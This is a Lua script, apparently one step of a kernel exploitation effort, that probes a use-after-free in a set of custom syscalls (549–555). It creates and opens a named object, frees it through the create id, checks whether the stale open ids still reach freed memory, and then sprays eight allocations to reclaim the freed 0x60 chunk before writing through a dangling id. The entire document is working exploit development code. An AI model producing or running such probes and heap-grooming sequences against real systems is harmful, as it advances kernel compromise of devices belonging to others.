-- CRASH_CLASS: HIGH
-- PROBE 827a: do the open ids still resolve after the create id destroys the object?
--
-- 826a case A: create(name,0x101) = id0 (refcount 1, name registered), then three
-- 551(name) opens = id1,id2,id3.  550(id0) returned 0 and the name lookup then
-- failed, i.e. 550 on the create id destroyed the object outright. 550(id1..3)
-- then returned -1 - which is either "entry already removed" or "entry present,
-- pointer freed". Those two cases are told apart by an op that only does a lookup
-- plus a use:
--   555(id,n)  lookup(table,id,0x120) then obj_op(obj, n)          <- write on the object
--   554(id,n)  lookup then compares [obj+0x40] with n              <- read of the object
-- If any of these answer 0/a value after 550(id0), the id table still holds a
-- pointer to the freed 0x60 object.

print("=== PROBE 827a: dangling open ids ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hx(v)
    if type(v) == "table" and v.h then
        return string.format("%08X%08X", to_num(v.h), to_num(v.l))
    end
    local n = to_num(v)
    if n < 0 then return string.format("-%X", -n) end
    return string.format("%X", n)
end
local function mkname(s)
    local p = memory.alloc(0x40)
    for i = 0, 0x3F do memory.write_byte(p + i, 0) end
    for i = 1, #s do memory.write_byte(p + i - 1, string.byte(s, i)) end
    return p
end
local function call(sc, ...)
    local a = {...}
    local ok, r = pcall(function() return sc(unpack(a)) end)
    return to_num(r or 0), ok
end

local sc549 = make_syscall(549)
local sc550 = make_syscall(550)
local sc551 = make_syscall(551)
local sc552 = make_syscall(552)
local sc553 = make_syscall(553)
local sc554 = make_syscall(554)
local sc555 = make_syscall(555)

local n = mkname("uaf1")
local id0 = call(sc549, n, uint64(0x101), uint64(0), uint64(0x100))
local id1 = call(sc551, n)
local id2 = call(sc551, n)
local id3 = call(sc551, n)
print(string.format("[A] create=%s open=%s %s %s", hx(id0), hx(id1), hx(id2), hx(id3)))

-- baseline: the open ids are live and usable
print(string.format("[B] baseline 554(open1,1)=%s  555(open2,1)=%s",
    hx((call(sc554, uint64(id1), uint64(1)))), hx((call(sc555, uint64(id2), uint64(1))))))

-- destroy through the create id
local freed = call(sc550, uint64(id0))
print(string.format("[C] 550(create)=%s  (object destroyed, opens left behind)", hx(freed)))

-- the dangling test: lookup-only ops on the open ids
local r1 = call(sc555, uint64(id1), uint64(0x11))
print(string.format("[D] 555(open1,0x11) = %s", hx(r1)))
local r2 = call(sc554, uint64(id1), uint64(1))
print(string.format("[D] 554(open1,1)   = %s", hx(r2)))
local r3 = call(sc550, uint64(id1))
print(string.format("[D] 550(open1)     = %s", hx(r3)))
local r4 = call(sc552, uint64(id1))
print(string.format("[D] 552(open1)     = %s", hx(r4)))

-- a 4-byte out pointer for 553, so its copyin cannot fail on its own
local out4 = memory.alloc(0x10)
memory.write_dword(out4, 0x41414141)
local r5 = call(sc553, uint64(id1), uint64(1), uint64(to_num(out4)))
print(string.format("[E] 553(open1,1,out) = %s  out=%08X", hx(r5), to_num(memory.read_dword(out4))))

-- fill the slot: several creates so a 0x60 chunk lands on the freed object
print("[F] creating eight objects to occupy the freed 0x60 slot")
local ids = {}
for i = 1, 8 do
    local nm = mkname("fill" .. i)
    ids[i] = call(sc549, nm, uint64(1), uint64(0), uint64(0x100))
end
local line = ""
for i = 1, 8 do line = line .. hx(ids[i]) .. " " end
print("[F] ids " .. line)

-- now use the stale id again: a write that would land inside the new occupant
local r6 = call(sc555, uint64(id1), uint64(0x21))
print(string.format("[G] 555(stale open1,0x21) = %s", hx(r6)))
local r7 = call(sc554, uint64(id2), uint64(1))
print(string.format("[G] 554(stale open2,1)   = %s", hx(r7)))
local r8 = call(sc553, uint64(id3), uint64(1), uint64(to_num(out4)))
print(string.format("[G] 553(stale open3,1,out) = %s out=%08X", hx(r8), to_num(memory.read_dword(out4))))

print("[H] alive=true")
print("=== PROBE 827a COMPLETE ===")
